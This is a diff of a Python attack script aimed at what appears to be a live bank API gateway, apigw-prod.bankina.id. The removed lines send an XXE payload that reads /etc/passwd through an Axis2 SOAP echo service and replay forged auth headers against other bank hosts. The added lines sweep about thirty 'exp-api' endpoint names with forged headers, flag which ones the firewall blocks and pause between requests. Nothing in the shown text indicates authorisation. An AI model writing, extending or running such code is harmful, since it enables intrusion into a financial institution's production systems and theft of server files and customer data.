@@ -88,29 +88,17 @@ for op in ["process", "callback", "notify", "handleResponse", "onEvent", "update
 for svc in ["LoanService", "CicilanService", "WorkflowService", "CallbackService", "BinaService", "OnboardingService", "MasterDataService"]:
     s, b = req("GET", "https://apigw-prod.bankina.id/services/" + svc, {"User-Agent": "Mozilla/5.0"})
     print("SVC " + svc + " => " + str(s) + " " + b[:60])
-print("== V12: apigw host lain + echo XXE ==")
-# forge ke host apigw lain
-for host in ["apigw.bankina.id", "api.bankina.id"]:
-    for path in ["/exp-api-cicilan/1.0/", "/exp-api-portal-loan/1.0/"]:
-        h = forge("GET", path)
-        s, b = req("GET", "https://" + host + path, {"User-Agent":"Mozilla/5.0", **h})
-        print(host + path + " => " + str(s) + " " + b[:150].replace("\n"," "))
-# echo XXE
-XXE = chr(60)+"?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ax=\"http://ws.apache.org/axis2\"><soapenv:Body><ax:echoString><args0>&xxe;</args0></ax:echoString></soapenv:Body></soapenv:Envelope>"
-print("XXE body:", XXE[:120])
-def soap3(host, service, action, body):
-    r = urllib.request.Request("https://" + host + "/services/" + service, data=body.encode(), method="POST",
-        headers={"Content-Type": "text/xml;charset=UTF-8", "SOAPAction": chr(34)+action+chr(34), "User-Agent": "Mozilla/5.0"})
-    try:
-        resp = urllib.request.urlopen(r, timeout=30, context=ctx)
-        return resp.status, resp.read()[:1200].decode("utf-8", "ignore")
-    except urllib.error.HTTPError as e:
-        return e.code, e.read()[:1200].decode("utf-8", "ignore")
-    except Exception as e:
-        return "ERR", str(e)[:120]
-s, b = soap3("apigw-prod.bankina.id", "echo", "urn:echoString", XXE)
-print("ECHO XXE => " + str(s) + " " + b[:600].replace("\n"," "))
-# echoString normal (args0)
-NORM = chr(60)+"?xml version=\"1.0\"?><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ax=\"http://ws.apache.org/axis2\"><soapenv:Body><ax:echoString><args0>hello123</args0></ax:echoString></soapenv:Body></soapenv:Envelope>"
-s, b = soap3("apigw-prod.bankina.id", "echo", "urn:echoString", NORM)
-print("ECHO NORM => " + str(s) + " " + b[:500].replace("\n"," "))
+print("== V13: SWEEP NAMA exp-api ==")
+names = ["exp-api-auth","exp-api-user","exp-api-users","exp-api-onboarding","exp-api-loan","exp-api-master","exp-api-bina","exp-api-cicilan","exp-api-portal-loan","exp-api-portal","exp-api-savings","exp-api-deposit","exp-api-account","exp-api-transfer","exp-api-payment","exp-api-qris","exp-api-partner","exp-api-webview","exp-api-customer","exp-api-kyc","exp-api-eform","exp-api-digital","exp-api-bankina","exp-api-ina","exp-api-bni","exp-api-callback","exp-api-workflow","exp-api-mall","exp-api-financing","exp-api-syariah"]
+import time
+for n in names:
+    path = "/" + n + "/1.0/"
+    h = forge("GET", path)
+    s, b = req("GET", "https://apigw-prod.bankina.id" + path, {"User-Agent":"Mozilla/5.0", **h})
+    if "700700" in b:
+        print("BLOCKED " + n)
+    elif s == 404:
+        print("404      " + n)
+    else:
+        print(">>> " + str(s) + " " + n + " => " + b[:120])
+    time.sleep(0.3)
